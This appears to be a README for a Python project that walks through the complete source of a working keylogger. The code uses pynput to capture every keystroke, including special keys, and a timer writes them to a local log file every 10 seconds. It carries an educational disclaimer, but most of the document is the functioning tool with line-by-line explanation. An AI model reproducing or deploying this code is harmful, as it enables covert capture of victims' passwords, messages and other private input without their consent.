# Simple_Keylogger
Overview
This is a simple keylogger written in Python. It captures and logs keystrokes on a user's keyboard and saves them to a file. This project is intended for educational purposes to demonstrate how keyloggers work and to raise awareness about the importance of cybersecurity and protecting personal information.


Features
Captures all keystrokes, including special keys (e.g., Enter, Backspace).
Logs keystrokes to a text file.
Cross-platform support (Windows, macOS, Linux).

Importing Libraries

import pynput.keyboard
import threading

pynput.keyboard: This module is used to listen to keyboard events. It provides tools to capture and react to keyboard inputs.
threading: This module is used to create and manage threads. Threads allow you to run multiple operations concurrently.

Global Variables
python

log = ""
log_file_path = "path/to/save/the/logfile/keylog.txt"
log: This variable will store the keystrokes as a string.
log_file_path: This specifies the path where the log file will be saved. Ensure the path points to a file, not a directory.

Function to Capture Key Presses
def on_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += " " + str(key) + " "
on_press(key): This function is called whenever a key is pressed.

global log: This allows the function to modify the log variable defined outside of the function.

try block: Attempts to get the character representation of the key and append it to the log.

except AttributeError: Handles special keys (like Enter, Shift, etc.) that do not have a char attribute.

if key == key.space: Adds a space to the log if the spacebar is pressed.

else block: Adds the string representation of the key to the log for other special keys.

Function to Periodically Write Logs to File

def report():
    global log
    with open(log_file_path, "a") as f:
        f.write(log)
    log = ""
    timer = threading.Timer(10, report)
    timer.start()
    
report(): This function writes the logged keystrokes to a file and schedules itself to run again.
global log: This allows the function to modify the log variable.

with open(log_file_path, "a") as f: Opens the log file in append mode ("a").

f.write(log): Writes the contents of log to the file.

log = "": Clears the log after writing to the file.

timer = threading.Timer(10, report): Creates a timer that will call the report function every 10 seconds (adjust the interval as needed).

timer.start(): Starts the timer.

Setting Up the Keyboard Listener
keyboard_listener = pynput.keyboard.Listener(on_press=on_press)
with keyboard_listener:
    report()
    keyboard_listener.join()
    
keyboard_listener = pynput.keyboard.Listener(on_press=on_press): Creates a keyboard listener that calls the on_press function whenever a key is pressed.

with keyboard_listener: Ensures the keyboard listener is properly managed and closed when done.

report(): Calls the report function for the first time to start the logging and reporting process.

keyboard_listener.join(): Keeps the listener running in the current thread to capture keystrokes.

This Python keylogger script captures keystrokes and logs them to a specified file at regular intervals. It imports necessary modules (pynput.keyboard for capturing keystrokes and threading for scheduling). It defines global variables for storing keystrokes and the log file path. The on_press function handles key presses, appending characters to the log and managing special keys. The report function writes the log to a file and schedules itself to run every 10 seconds using a timer. The keyboard listener is set up to capture keystrokes and starts the reporting process. This ensures continuous monitoring and logging of keyboard input. Use this script responsibly and only in authorized environments.



